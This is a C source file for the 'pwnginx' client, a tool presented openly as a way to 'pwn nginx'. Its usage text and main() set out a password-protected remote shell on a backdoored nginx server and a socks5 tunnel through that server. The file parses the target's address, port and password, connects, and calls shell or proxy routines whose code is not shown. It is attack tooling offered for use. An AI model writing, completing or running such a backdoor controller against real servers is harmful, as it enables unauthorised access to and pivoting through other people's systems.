/*                                 
 *  pwnginx.c - pwnginx client
 *  t57root@gmail.com              
 *  openwill.me / www.hackshell.net
 */ 
#include <sys/types.h>  
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <bits/signum.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <netdb.h>
 
#include <string.h>
#include <sys/time.h>
#include <sys/types.h>
#include <pthread.h>

#include "functions.h"


char *password;
char *ip;
char *port;
char *socks5ip;
char *socks5port;

int main(int argc,char **argv)
{
    printf("[ Pwnginx ] - Pwn nginx\n"
    "Copyleft by t57root @ openwill.me\n"
    "<t57root@gmail.com>  [www.HackShell.net]\n\n"
    "Usage:\n"
    "Get a shell access via the nginx running @ [ip]:[port]\n\t%s shell [ip] [port] [password]\n"
    "Get a socks5 tunnel listening at [socks5ip]:[socks5port]\n\t%s socks5 [ip] [port] [password] [socks5ip] [socks5port]\n"
    ,argv[0],argv[0]);
    char *action = argv[1];
    ip = argv[2];
    port = argv[3];
    password = argv[4];

    int function = 0;

    if((argc==5 && strncmp(action,"shell",5)==0)){
        function = 1;
        printf("\n[i] Obtaining shell access\n");
    }
    else if((argc==7 && strncmp(action,"socks5",6)==0)){
        function = 2;
        socks5ip = argv[5];
        socks5port = argv[6];
        printf("\n[i] Obtaining a socks5 proxy tunnel\n");
    }
    else return 0;

    printf("[i] About to connect to nginx\n");

    int fd = init_connection(ip,port,function);
    if(fd<0){
        return -1;
    }

    if(function==1){
        exec_shell(fd);
    }
    else if(function==2){
        close(fd);
        exec_socks5();
    }

    return 0;
}
